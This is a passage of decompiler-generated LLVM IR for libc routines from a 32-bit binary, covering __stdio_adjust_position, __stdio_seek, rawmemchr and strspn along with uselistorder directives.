  uselistorder i32* @edi, { 27, 0, 28, 29, 30, 122, 123, 124, 125, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 1, 42, 43, 44, 45, 46, 47, 48, 203, 204, 2, 205, 206, 3, 209, 210, 160, 161, 162, 211, 212, 227, 228, 49, 4, 50, 51, 52, 20, 21, 22, 23, 24, 25, 26, 135, 5, 136, 137, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 6, 193, 194, 195, 196, 197, 99, 100, 101, 102, 103, 53, 54, 7, 55, 225, 226, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 8, 80, 17, 18, 19, 66, 9, 67, 68, 81, 221, 222, 223, 224, 82, 83, 84, 207, 208, 138, 139, 158, 159, 163, 164, 218, 219, 220, 165, 166, 85, 86, 87, 213, 214, 215, 216, 217, 88, 89, 90, 91, 92, 93, 96, 94, 95, 97, 98, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 126, 127, 128, 129, 130, 131, 132, 133, 134, 140, 141, 142, 10, 11, 12, 13, 14, 15, 16, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 167, 168, 169, 198, 199, 200, 201, 202 }
  uselistorder i32* @ebp, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 7, 8, 9, 44, 45, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 79, 75, 76, 77, 78, 1, 80, 2, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 4, 5, 6, 36, 37, 38, 39, 40, 41, 42, 43, 3, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 81, 82, 83, 84 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052145, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052130, { 1, 0 }
  uselistorder label %dec_label_pc_80520f7, { 1, 0 }
  uselistorder label %dec_label_pc_80520c9, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8052160 = load i32, i32* %arg1, align 4
  store i32 %v2_8052160, i32* %esi.global-to-local, align 4
  %v1_8052167 = urem i32 %v2_8052160, 4
  %v2_8052167 = icmp eq i32 %v1_8052167, 0
  store i32 %v1_8052167, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052167, label %dec_label_pc_8052196, label %dec_label_pc_805216c

dec_label_pc_805216c:                             ; preds = %entry
  %v1_805216e = add nsw i32 %v1_8052167, -1
  %v8_805216e = icmp eq i32 %v1_805216e, 0
  store i32 %v1_805216e, i32* @edx, align 4
  br i1 %v8_805216e, label %dec_label_pc_8052196, label %dec_label_pc_8052171

dec_label_pc_8052171:                             ; preds = %dec_label_pc_805216c
  %v3_8052171 = and i32 %v2_8052160, 2048
  %v4_8052171 = icmp eq i32 %v3_8052171, 0
  br i1 %v4_8052171, label %dec_label_pc_8052196, label %dec_label_pc_8052176

dec_label_pc_8052176:                             ; preds = %dec_label_pc_8052171
  %v6_8052176 = sub nsw i32 1, %v1_8052167
  %v7_8052176 = and i32 %v1_805216e, %v6_8052176
  %v8_8052176 = icmp slt i32 %v7_8052176, 0
  %v9_8052176 = icmp eq i32 %v1_8052167, 2
  %v10_8052176 = icmp ult i32 %v1_8052167, 2
  %v3_8052179 = icmp eq i1 %v10_8052176, %v8_8052176
  %v4_8052179 = icmp eq i1 %v9_8052176, false
  %v5_8052179 = and i1 %v4_8052179, %v3_8052179
  br i1 %v5_8052179, label %dec_label_pc_80521ec, label %dec_label_pc_805217b

dec_label_pc_805217b:                             ; preds = %dec_label_pc_8052176
  %v1_805217b = add i32 %tmp6, 40
  %v2_805217b = inttoptr i32 %v1_805217b to i32*
  %v3_805217b = load i32, i32* %v2_805217b, align 4
  %v4_805217b = icmp eq i32 %v3_805217b, 0
  %v1_805217f = icmp eq i1 %v4_805217b, false
  br i1 %v1_805217f, label %dec_label_pc_80521ec, label %dec_label_pc_8052181

dec_label_pc_8052181:                             ; preds = %dec_label_pc_805217b
  %v1_8052181 = add i32 %tmp6, 3
  %v2_8052181 = inttoptr i32 %v1_8052181 to i8*
  %v3_8052181 = load i8, i8* %v2_8052181, align 1
  %v4_8052181 = zext i8 %v3_8052181 to i32
  %v2_8052185 = sub nsw i32 %v1_805216e, %v4_8052181
  %v1_8052187 = add i32 %tmp6, 44
  %v2_8052187 = inttoptr i32 %v1_8052187 to i32*
  %v3_8052187 = load i32, i32* %v2_8052187, align 4
  %v1_805218b = add nsw i32 %v2_8052185, -1
  %tmp12 = icmp slt i32 %v3_8052187, 1
  br i1 %tmp12, label %dec_label_pc_8052196, label %dec_label_pc_8052190

dec_label_pc_8052190:                             ; preds = %dec_label_pc_8052181
  %v1_8052190 = add i32 %tmp6, 2
  %v2_8052190 = inttoptr i32 %v1_8052190 to i8*
  %v3_8052190 = load i8, i8* %v2_8052190, align 1
  %v4_8052190 = zext i8 %v3_8052190 to i32
  %v2_8052194 = sub nsw i32 %v1_805218b, %v4_8052190
  br label %dec_label_pc_8052196

dec_label_pc_8052196:                             ; preds = %dec_label_pc_8052181, %dec_label_pc_8052171, %dec_label_pc_805216c, %entry, %dec_label_pc_8052190
  %v0_80521ad = phi i32 [ %v1_805218b, %dec_label_pc_8052181 ], [ %v1_805216e, %dec_label_pc_8052171 ], [ 0, %dec_label_pc_805216c ], [ 0, %entry ], [ %v2_8052194, %dec_label_pc_8052190 ]
  %v2_8052196 = and i32 %v2_8052160, 64
  %v3_8052196 = icmp eq i32 %v2_8052196, 0
  %storemerge.in.in.v = select i1 %v3_8052196, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80521a5 = add i32 %tmp6, 16
  %v3_80521a5 = inttoptr i32 %v2_80521a5 to i32*
  %v4_80521a5 = load i32, i32* %v3_80521a5, align 4
  %v5_80521a5 = sub i32 %storemerge, %v4_80521a5
  %v1_80521a8 = inttoptr i32 %arg2 to i32*
  %v2_80521a8 = load i32, i32* %v1_80521a8, align 4
  store i32 %v2_80521a8, i32* %ecx.global-to-local, align 4
  %v1_80521aa = add i32 %arg2, 4
  %v2_80521aa = inttoptr i32 %v1_80521aa to i32*
  %v3_80521aa = load i32, i32* %v2_80521aa, align 4
  store i32 %v3_80521aa, i32* %ebx.global-to-local, align 4
  %v2_80521ad = add i32 %v5_80521a5, %v0_80521ad
  store i32 %v2_80521ad, i32* %esi.global-to-local, align 4
  %v2_80521b8 = ashr i32 %v2_80521ad, 31
  %v5_80521c1 = sub i32 %v2_80521a8, %v2_80521ad
  %v10_80521c1 = icmp ult i32 %v2_80521a8, %v2_80521ad
  %v6_80521c5 = zext i1 %v10_80521c1 to i32
  %tmp = icmp slt i32 %v2_80521ad, 0
  %v2_80521b8.neg = zext i1 %tmp to i32
  %v7_80521c5 = add i32 %v3_80521aa, %v2_80521b8.neg
  %v8_80521c5 = add i32 %v7_80521c5, %v6_80521c5
  store i32 %v8_80521c5, i32* @edx, align 4
  store i32 %v5_80521c1, i32* %v1_80521a8, align 4
  %v0_80521cb = load i32, i32* @edx, align 4
  %v1_80521cb = load i32, i32* %edi.global-to-local, align 4
  %v2_80521cb = add i32 %v1_80521cb, 4
  %v3_80521cb = inttoptr i32 %v2_80521cb to i32*
  store i32 %v0_80521cb, i32* %v3_80521cb, align 4
  %v0_80521ce = load i32, i32* %edi.global-to-local, align 4
  %v1_80521ce = add i32 %v0_80521ce, 4
  %v2_80521ce = inttoptr i32 %v1_80521ce to i32*
  %v3_80521ce = load i32, i32* %v2_80521ce, align 4
  %v4_80521ce = load i32, i32* %ebx.global-to-local, align 4
  %v5_80521d1 = icmp slt i32 %v3_80521ce, %v4_80521ce
  br i1 %v5_80521d1, label %dec_label_pc_80521db, label %dec_label_pc_80521d3

dec_label_pc_80521d3:                             ; preds = %dec_label_pc_8052196
  %v8_80521d3 = icmp sgt i32 %v3_80521ce, %v4_80521ce
  br i1 %v8_80521d3, label %dec_label_pc_80521d9, label %dec_label_pc_80521d5

dec_label_pc_80521d5:                             ; preds = %dec_label_pc_80521d3
  %v1_80521d5 = inttoptr i32 %v0_80521ce to i32*
  %v2_80521d5 = load i32, i32* %v1_80521d5, align 4
  %v3_80521d5 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80521d5, %v3_80521d5
  br i1 %tmp14, label %dec_label_pc_80521d9, label %dec_label_pc_80521db

dec_label_pc_80521d9:                             ; preds = %dec_label_pc_80521d5, %dec_label_pc_80521d3
  %v0_80521d9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521d9 = sub i32 0, %v0_80521d9
  store i32 %v1_80521d9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80521db

dec_label_pc_80521db:                             ; preds = %dec_label_pc_80521d5, %dec_label_pc_8052196, %dec_label_pc_80521d9
  %v0_80521db = load i32, i32* %esi.global-to-local, align 4
  %v2_80521db = icmp slt i32 %v0_80521db, 0
  %v1_80521dd = icmp eq i1 %v2_80521db, false
  br i1 %v1_80521dd, label %dec_label_pc_80521ef, label %dec_label_pc_80521df

dec_label_pc_80521df:                             ; preds = %dec_label_pc_80521db
  %v1_80521df = call i32 @__errno_location(i32 %v2_80521b8)
  %v1_80521e4 = inttoptr i32 %v1_80521df to i32*
  store i32 75, i32* %v1_80521e4, align 4
  %v0_80521f2.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80521ef

dec_label_pc_80521ec:                             ; preds = %dec_label_pc_805217b, %dec_label_pc_8052176
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80521ef

dec_label_pc_80521ef:                             ; preds = %dec_label_pc_80521db, %dec_label_pc_80521df, %dec_label_pc_80521ec
  %v0_80521f2 = phi i32 [ %v0_80521db, %dec_label_pc_80521db ], [ %v0_80521f2.pre, %dec_label_pc_80521df ], [ -1, %dec_label_pc_80521ec ]
  ret i32 %v0_80521f2

; uselistorder directives
  uselistorder i32 %v4_80521ce, { 1, 0 }
  uselistorder i32 %v3_80521ce, { 1, 0 }
  uselistorder i32 %v1_805216e, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8052167, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8052160, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 16, { 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 114, 23, 24, 33, 25, 83, 29, 39, 99, 40, 118, 107, 8, 7, 108, 0, 9, 119, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 1, 63, 64, 65, 66, 67, 10, 68, 69, 30, 70, 115, 116, 117, 2, 71, 72, 73, 74, 76, 75, 77, 78, 79, 80, 81, 82, 32, 26, 84, 85, 88, 14, 11, 12, 13, 86, 87, 89, 92, 15, 16, 17, 90, 91, 93, 94, 95, 31, 96, 97, 4, 5, 98, 100, 101, 102, 27, 34, 22, 35, 36, 18, 37, 19, 20, 21, 38, 6, 103, 104, 105, 106, 28, 3, 109, 110, 111, 112, 113 }
  uselistorder i32 8, { 40, 60, 61, 62, 63, 64, 65, 66, 41, 67, 68, 69, 173, 174, 35, 180, 36, 181, 37, 55, 19, 57, 120, 126, 58, 59, 127, 128, 129, 130, 131, 132, 133, 1, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 2, 144, 145, 146, 147, 148, 44, 3, 45, 4, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 43, 166, 167, 5, 168, 169, 170, 171, 6, 172, 179, 70, 14, 15, 56, 71, 72, 73, 74, 76, 77, 78, 75, 79, 80, 81, 82, 20, 21, 83, 84, 85, 86, 87, 88, 16, 175, 176, 177, 178, 89, 90, 91, 92, 18, 46, 47, 48, 93, 94, 95, 96, 42, 97, 49, 0, 98, 99, 100, 17, 101, 102, 103, 104, 105, 106, 107, 108, 54, 109, 110, 22, 38, 23, 111, 112, 50, 12, 24, 39, 25, 113, 114, 51, 13, 115, 116, 117, 118, 9, 119, 10, 52, 26, 53, 121, 34, 33, 32, 30, 31, 27, 28, 29, 11, 122, 123, 124, 125, 8, 7 }
  uselistorder i32 20, { 6, 19, 7, 20, 21, 5, 10, 17, 33, 18, 22, 23, 24, 1, 25, 2, 26, 8, 27, 28, 36, 29, 30, 31, 32, 34, 11, 12, 4, 13, 14, 15, 3, 16, 0, 35, 9 }
  uselistorder i32 64, { 2, 0, 5, 6, 4, 1, 3 }
  uselistorder i32 44, { 5, 6, 13, 4, 10, 12, 11, 7, 8, 9, 0, 1, 2, 3 }
  uselistorder i32 40, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 2048, { 4, 3, 8, 5, 7, 0, 1, 2, 10, 6, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521ef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80521db, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052196, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8052204 = add i32 %tmp5, 4
  %v2_8052204 = inttoptr i32 %v1_8052204 to i32*
  %v3_8052204 = load i32, i32* %v2_8052204, align 4
  %v2_8052207 = load i32, i32* %arg2, align 4
  %v1_805220d = add i32 %arg1, 4
  %v2_805220d = inttoptr i32 %v1_805220d to i32*
  %v3_805220d = load i32, i32* %v2_805220d, align 4
  %v4_8052210 = call i32 @__libc_lseek64(i32 %v3_805220d, i32 %v2_8052207, i32 %v3_8052204, i32 %arg3)
  %v0_805221a = load i32, i32* @edx, align 4
  %v2_805221a = icmp slt i32 %v0_805221a, 0
  br i1 %v2_805221a, label %dec_label_pc_8052225, label %dec_label_pc_805221e

dec_label_pc_805221e:                             ; preds = %entry
  %v1_805221e = load i32, i32* @ebx, align 4
  %v2_805221e = inttoptr i32 %v1_805221e to i32*
  store i32 %v4_8052210, i32* %v2_805221e, align 4
  %v0_8052220 = load i32, i32* @edx, align 4
  %v1_8052220 = load i32, i32* @ebx, align 4
  %v2_8052220 = add i32 %v1_8052220, 4
  %v3_8052220 = inttoptr i32 %v2_8052220 to i32*
  store i32 %v0_8052220, i32* %v3_8052220, align 4
  br label %dec_label_pc_8052225

dec_label_pc_8052225:                             ; preds = %entry, %dec_label_pc_805221e
  %v0_8052225 = phi i32 [ %v4_8052210, %entry ], [ 0, %dec_label_pc_805221e ]
  ret i32 %v0_8052225

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8052225, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805222d = load i32, i32* @ebx, align 4
  %v4_805222e = urem i32 %arg2, 256
  %v4_8052232 = ptrtoint i8* %arg1 to i32
  %v2_805223d3 = urem i32 %v4_8052232, 4
  %v3_805223d4 = icmp eq i32 %v2_805223d3, 0
  %v1_805223f8 = icmp eq i1 %v3_805223d4, false
  %v4_8052238 = trunc i32 %arg2 to i8
  br i1 %v1_805223f8, label %dec_label_pc_8052238, label %dec_label_pc_8052241

dec_label_pc_8052238:                             ; preds = %entry, %dec_label_pc_805223c
  %v0_805223c = phi i32 [ %v1_805223c, %dec_label_pc_805223c ], [ %v4_8052232, %entry ]
  %v1_8052238 = inttoptr i32 %v0_805223c to i8*
  %v2_8052238 = load i8, i8* %v1_8052238, align 1
  %v15_8052238 = icmp eq i8 %v2_8052238, %v4_8052238
  br i1 %v15_8052238, label %dec_label_pc_805228c, label %dec_label_pc_805223c

dec_label_pc_805223c:                             ; preds = %dec_label_pc_8052238
  %v1_805223c = add i32 %v0_805223c, 1
  %v2_805223d = urem i32 %v1_805223c, 4
  %v3_805223d = icmp eq i32 %v2_805223d, 0
  %v1_805223f = icmp eq i1 %v3_805223d, false
  br i1 %v1_805223f, label %dec_label_pc_8052238, label %dec_label_pc_8052241

dec_label_pc_8052241:                             ; preds = %entry, %dec_label_pc_805223c
  %v0_8052244 = phi i32 [ %v1_805223c, %dec_label_pc_805223c ], [ %v4_8052232, %entry ]
  %v2_8052248 = mul nuw nsw i32 %v4_805222e, 256
  %v2_805224b = or i32 %v2_8052248, %v4_805222e
  %v2_805224f = mul i32 %v2_805224b, 65536
  %v2_8052252 = or i32 %v2_805224f, %v2_805224b
  br label %dec_label_pc_8052254

dec_label_pc_8052254:                             ; preds = %dec_label_pc_8052284, %dec_label_pc_8052254, %dec_label_pc_8052241
  %v0_8052258 = phi i32 [ %v0_8052244, %dec_label_pc_8052241 ], [ %v1_8052258, %dec_label_pc_8052254 ], [ %v1_8052258, %dec_label_pc_8052284 ]
  %v2_8052256 = inttoptr i32 %v0_8052258 to i32*
  %v3_8052256 = load i32, i32* %v2_8052256, align 4
  %v4_8052256 = xor i32 %v3_8052256, %v2_8052252
  %v1_8052258 = add i32 %v0_8052258, 4
  store i32 %v1_8052258, i32* @ecx, align 4
  %v1_805225b = add i32 %v4_8052256, 2130640639
  %v1_8052261 = sub i32 -1, %v4_8052256
  store i32 %v1_8052261, i32* @edx, align 4
  %v2_8052263 = xor i32 %v1_805225b, %v1_8052261
  %v1_8052265 = and i32 %v2_8052263, -2130640640
  %v2_8052265 = icmp eq i32 %v1_8052265, 0
  br i1 %v2_8052265, label %dec_label_pc_8052254, label %dec_label_pc_805226c

dec_label_pc_805226c:                             ; preds = %dec_label_pc_8052254
  %v2_805226f = inttoptr i32 %v0_8052258 to i8*
  %v3_805226f = load i8, i8* %v2_805226f, align 1
  %v16_805226f = icmp eq i8 %v3_805226f, %v4_8052238
  br i1 %v16_805226f, label %dec_label_pc_805228c, label %dec_label_pc_8052274

dec_label_pc_8052274:                             ; preds = %dec_label_pc_805226c
  %v1_8052274 = add i32 %v0_8052258, 1
  %v2_8052277 = inttoptr i32 %v1_8052274 to i8*
  %v3_8052277 = load i8, i8* %v2_8052277, align 1
  %v16_8052277 = icmp eq i8 %v3_8052277, %v4_8052238
  br i1 %v16_8052277, label %dec_label_pc_805228c, label %dec_label_pc_805227c

dec_label_pc_805227c:                             ; preds = %dec_label_pc_8052274
  %v1_805227c = add i32 %v0_8052258, 2
  %v2_805227f = inttoptr i32 %v1_805227c to i8*
  %v3_805227f = load i8, i8* %v2_805227f, align 1
  %v16_805227f = icmp eq i8 %v3_805227f, %v4_8052238
  br i1 %v16_805227f, label %dec_label_pc_805228c, label %dec_label_pc_8052284

dec_label_pc_8052284:                             ; preds = %dec_label_pc_805227c
  %v1_8052284 = add i32 %v0_8052258, 3
  %v2_8052287 = inttoptr i32 %v1_8052284 to i8*
  %v3_8052287 = load i8, i8* %v2_8052287, align 1
  %v16_8052287 = icmp eq i8 %v3_8052287, %v4_8052238
  %v1_805228a = icmp eq i1 %v16_8052287, false
  br i1 %v1_805228a, label %dec_label_pc_8052254, label %dec_label_pc_805228c

dec_label_pc_805228c:                             ; preds = %dec_label_pc_8052238, %dec_label_pc_8052284, %dec_label_pc_805227c, %dec_label_pc_8052274, %dec_label_pc_805226c
  %v0_805228e = phi i32 [ %v1_8052284, %dec_label_pc_8052284 ], [ %v1_805227c, %dec_label_pc_805227c ], [ %v1_8052274, %dec_label_pc_8052274 ], [ %v0_8052258, %dec_label_pc_805226c ], [ %v0_805223c, %dec_label_pc_8052238 ]
  store i32 %v0_805222d, i32* @ebx, align 4
  ret i32 %v0_805228e

; uselistorder directives
  uselistorder i32 %v1_8052261, { 1, 0 }
  uselistorder i32 %v1_8052258, { 2, 1, 0 }
  uselistorder i32 %v2_805224b, { 1, 0 }
  uselistorder i32 %v1_805223c, { 1, 0, 2 }
  uselistorder i32 %v4_8052232, { 2, 1, 0 }
  uselistorder i32 %v4_805222e, { 1, 0 }
  uselistorder i32 3, { 12, 40, 6, 2, 3, 1, 24, 4, 25, 36, 13, 37, 30, 45, 15, 16, 31, 26, 11, 8, 9, 7, 10, 20, 32, 27, 33, 28, 41, 29, 42, 43, 44, 17, 34, 18, 35, 38, 39, 0, 14, 19, 21, 22, 23, 5 }
  uselistorder i32 2, { 44, 96, 45, 42, 97, 92, 117, 118, 50, 98, 99, 64, 1, 54, 55, 125, 67, 91, 0, 68, 88, 69, 89, 70, 90, 46, 2, 108, 39, 71, 3, 4, 5, 6, 120, 7, 8, 65, 9, 115, 116, 47, 48, 49, 10, 56, 57, 58, 100, 101, 53, 11, 12, 102, 40, 13, 103, 14, 59, 104, 105, 119, 124, 66, 15, 106, 16, 17, 43, 107, 18, 74, 72, 73, 75, 19, 20, 21, 22, 23, 24, 25, 26, 109, 76, 27, 110, 77, 28, 60, 29, 30, 31, 32, 36, 33, 37, 34, 78, 79, 61, 80, 81, 82, 51, 83, 93, 94, 95, 84, 85, 111, 38, 112, 113, 52, 41, 114, 86, 87, 62, 123, 63, 121, 35, 122 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 65536, { 0, 1, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11, 75, 76, 12, 13, 18, 14, 19, 15, 20, 16, 21, 17, 25, 22, 26, 23, 27, 24, 28, 29, 31, 30, 33, 32, 34, 38, 35, 39, 36, 40, 37, 41, 43, 42, 46, 44, 47, 45, 48, 49, 52, 50, 53, 51, 54, 55, 56, 57, 58, 60, 59, 61, 62, 65, 66, 67, 63, 68, 64, 70, 69, 71, 73, 72, 74 }
  uselistorder i32 4, { 204, 1, 2, 130, 131, 132, 133, 134, 135, 3, 4, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 59, 146, 276, 147, 277, 278, 284, 285, 290, 291, 292, 279, 53, 100, 148, 149, 280, 281, 282, 283, 5, 117, 118, 119, 120, 121, 75, 206, 207, 208, 67, 214, 215, 216, 217, 122, 123, 124, 125, 126, 68, 6, 127, 128, 286, 288, 226, 227, 228, 229, 230, 231, 7, 232, 233, 234, 235, 236, 237, 238, 239, 224, 225, 240, 56, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 27, 261, 262, 264, 263, 8, 129, 287, 150, 151, 289, 9, 152, 153, 10, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 33, 34, 101, 30, 171, 172, 173, 181, 174, 175, 176, 32, 76, 77, 78, 79, 177, 35, 36, 80, 178, 69, 81, 70, 82, 179, 11, 180, 12, 13, 28, 14, 0, 15, 182, 183, 16, 184, 185, 186, 17, 187, 188, 189, 83, 190, 84, 191, 192, 193, 194, 195, 196, 197, 37, 198, 96, 199, 57, 200, 38, 60, 85, 40, 39, 201, 97, 202, 58, 203, 41, 61, 86, 62, 71, 72, 73, 205, 87, 88, 89, 25, 90, 91, 74, 26, 92, 93, 54, 95, 63, 42, 94, 55, 52, 51, 102, 103, 50, 104, 105, 106, 107, 48, 49, 108, 98, 109, 43, 110, 44, 45, 46, 47, 111, 112, 113, 114, 115, 209, 18, 210, 211, 212, 213, 218, 29, 19, 219, 20, 64, 65, 99, 220, 66, 221, 222, 21, 31, 22, 23, 223, 24, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 116 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 6, 7, 28, 29, 8, 30, 31, 9, 10, 33, 11, 12, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 32, 34, 24, 25, 26, 27 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805228c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8052241, { 1, 0 }
  uselistorder label %dec_label_pc_8052238, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_80522b230 = load i8, i8* %arg1, align 1
  %v4_80522b434 = icmp eq i8 %v2_80522b230, 0
  br i1 %v4_80522b434, label %dec_label_pc_80522bc, label %dec_label_pc_80522b8.lr.ph

dec_label_pc_80522b8.lr.ph:                       ; preds = %entry
  %v3_80522b231 = zext i8 %v2_80522b230 to i32
  %v4_80522b2.pre = load i32, i32* @eax, align 4
  %v5_80522b232 = and i32 %v4_80522b2.pre, -256
  %v6_80522b233 = or i32 %v3_80522b231, %v5_80522b232
  %v4_8052299 = ptrtoint i8* %arg1 to i32
  %v1_80522a418 = inttoptr i32 %arg2 to i8*
  %v4_80522a4.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80522b8

dec_label_pc_805229f:                             ; preds = %dec_label_pc_80522b8, %dec_label_pc_80522a3
  %v6_80522a427 = phi i32 [ %v6_80522a4, %dec_label_pc_80522a3 ], [ %v6_80522a422, %dec_label_pc_80522b8 ]
  %v2_80522a426 = phi i8 [ %v2_80522a4, %dec_label_pc_80522a3 ], [ %v2_80522a419, %dec_label_pc_80522b8 ]
  %v0_80522a325 = phi i32 [ %v1_80522a3, %dec_label_pc_80522a3 ], [ %arg2, %dec_label_pc_80522b8 ]
  %v15_805229f = icmp eq i8 %v2_80522b237, %v2_80522a426
  br i1 %v15_805229f, label %dec_label_pc_80522ac, label %dec_label_pc_80522a3

dec_label_pc_80522a3:                             ; preds = %dec_label_pc_805229f
  %v1_80522a3 = add i32 %v0_80522a325, 1
  store i32 %v1_80522a3, i32* @edx, align 4
  %v1_80522a4 = inttoptr i32 %v1_80522a3 to i8*
  %v2_80522a4 = load i8, i8* %v1_80522a4, align 1
  %v3_80522a4 = zext i8 %v2_80522a4 to i32
  %v5_80522a4 = and i32 %v6_80522a427, -256
  %v6_80522a4 = or i32 %v3_80522a4, %v5_80522a4
  store i32 %v6_80522a4, i32* @ecx, align 4
  %v4_80522a6 = icmp eq i8 %v2_80522a4, 0
  %v1_80522a8 = icmp eq i1 %v4_80522a6, false
  br i1 %v1_80522a8, label %dec_label_pc_805229f, label %dec_label_pc_80522bc

dec_label_pc_80522ac:                             ; preds = %dec_label_pc_805229f
  %v1_80522b0 = add i32 %v0_80522bc35, 1
  %v1_80522b1 = add i32 %v0_80522b136, 1
  %v1_80522b2 = inttoptr i32 %v1_80522b1 to i8*
  %v2_80522b2 = load i8, i8* %v1_80522b2, align 1
  %v3_80522b2 = zext i8 %v2_80522b2 to i32
  %v5_80522b2 = and i32 %v6_80522b238, -256
  %v6_80522b2 = or i32 %v3_80522b2, %v5_80522b2
  %v4_80522b4 = icmp eq i8 %v2_80522b2, 0
  br i1 %v4_80522b4, label %dec_label_pc_80522bc, label %dec_label_pc_80522b8

dec_label_pc_80522b8:                             ; preds = %dec_label_pc_80522b8.lr.ph, %dec_label_pc_80522ac
  %v4_80522a4.pre = phi i32 [ %v4_80522a4.pre.pre, %dec_label_pc_80522b8.lr.ph ], [ %v6_80522a427, %dec_label_pc_80522ac ]
  %v6_80522b238 = phi i32 [ %v6_80522b233, %dec_label_pc_80522b8.lr.ph ], [ %v6_80522b2, %dec_label_pc_80522ac ]
  %v2_80522b237 = phi i8 [ %v2_80522b230, %dec_label_pc_80522b8.lr.ph ], [ %v2_80522b2, %dec_label_pc_80522ac ]
  %v0_80522b136 = phi i32 [ %v4_8052299, %dec_label_pc_80522b8.lr.ph ], [ %v1_80522b1, %dec_label_pc_80522ac ]
  %v0_80522bc35 = phi i32 [ 0, %dec_label_pc_80522b8.lr.ph ], [ %v1_80522b0, %dec_label_pc_80522ac ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80522a419 = load i8, i8* %v1_80522a418, align 1
  %v3_80522a420 = zext i8 %v2_80522a419 to i32
  %v5_80522a421 = and i32 %v4_80522a4.pre, -256
  %v6_80522a422 = or i32 %v3_80522a420, %v5_80522a421
  store i32 %v6_80522a422, i32* @ecx, align 4
  %v4_80522a623 = icmp eq i8 %v2_80522a419, 0
  %v1_80522a824 = icmp eq i1 %v4_80522a623, false
  br i1 %v1_80522a824, label %dec_label_pc_805229f, label %dec_label_pc_80522bc

dec_label_pc_80522bc:                             ; preds = %entry, %dec_label_pc_80522ac, %dec_label_pc_80522b8, %dec_label_pc_80522a3
  %v0_80522bc17 = phi i32 [ %v0_80522bc35, %dec_label_pc_80522a3 ], [ %v0_80522bc35, %dec_label_pc_80522b8 ], [ 0, %entry ], [ %v1_80522b0, %dec_label_pc_80522ac ]
  ret i32 %v0_80522bc17

; uselistorder directives
  uselistorder i32 %v6_80522a422, { 1, 0 }
  uselistorder i8 %v2_80522a419, { 1, 2, 0 }
  uselistorder i32 %v1_80522b1, { 1, 0 }
  uselistorder i32 %v6_80522a4, { 1, 0 }
  uselistorder i8 %v2_80522a4, { 1, 2, 0 }
